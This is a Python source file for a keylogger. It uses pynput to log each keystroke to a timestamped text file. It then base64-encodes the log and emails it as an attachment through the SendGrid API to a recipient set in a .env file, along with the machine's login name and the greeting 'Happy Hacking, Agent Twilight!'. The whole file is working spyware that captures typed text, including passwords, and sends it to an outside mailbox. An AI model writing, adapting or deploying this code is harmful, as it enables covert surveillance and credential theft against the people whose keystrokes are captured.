# from pynput.keyboard import Listener
from dotenv import get_key
from sendgrid import SendGridAPIClient
from sendgrid.helpers.mail import Mail,Attachment,FileContent,FileName,FileType,Disposition,ContentId

import base64
import os
from pynput import keyboard
import time
class Keylogger:
    def __init__(self):
        print("Keylogger initiated")
        self.filename = str(f"files/FILE-{str(time.strftime("%Y-%m-%d-%H-%M"))}.txt")
        with keyboard.Listener(on_press=self.on_press,on_release=self.on_release) as listener:
            listener.join()
            

    def on_press(self,key, injected):
        try:
            print('alphanumeric key {} pressed; it was {}'.format(
                key.char, 'faked' if injected else 'not faked'))
            with open(self.filename,'a') as f:
                f.write(key.char)
            f.close()
            
        except AttributeError:
            print('special key {} pressed'.format(
                key))

    def on_release(self,key, injected):
        try:
            print('{} released; it was {}'.format(
                key, 'faked' if injected else 'not faked'))
            if key == keyboard.Key.esc:
                # Stop listener
                return False
            elif key == keyboard.Key.enter:
                with open(self.filename,'a') as f:
                    f.write("\n")
                f.close()
                print("Enter is pressed")
            elif key == keyboard.Key.space:
                with open(self.filename,'a') as f:
                    f.write(" ")
                f.close()
        except AttributeError:
            with open(self.filename,'a') as f:
                    f.write("\n")
                    f.write(str(key))
            f.close()

if __name__ == '__main__':
    keylogger = Keylogger()
    key = get_key(dotenv_path=".env",key_to_get='SENDGRID_API_KEY')
    sg = SendGridAPIClient(api_key=str(key))
    loginName = os.getlogin()
    with open(keylogger.filename,'rb') as file:
        b64content = base64.b64encode(file.read()).decode('utf-8')
        print(b64content)
    file.close()
    message = Mail(
        from_email=str(get_key(dotenv_path=".env",key_to_get="FROM")),
    subject=f"Keylogger File - SENT AT : {str(time.strftime("%Y-%m-%d-%H-%M-%S"))}",
    html_content=f'<h1>Happy Hacking, Agent Twilight!</h1> <br> <strong> This is the file containing the key strokes from the PC {loginName if loginName else "loginNotFound"} </strong>',
    to_emails=str(get_key(dotenv_path=".env",key_to_get="RECIPIENT"))
    )
    message.attachment = Attachment(FileContent(b64content),
                                FileName(keylogger.filename),
                                FileType('plain/text'),
                                Disposition('attachment'),
                                ContentId(keylogger.filename))
    try:
        response = sg.send(message)
        print(response.status_code)
        print(response.body)
        print(response.headers)
    except Exception as e:
        print(e)
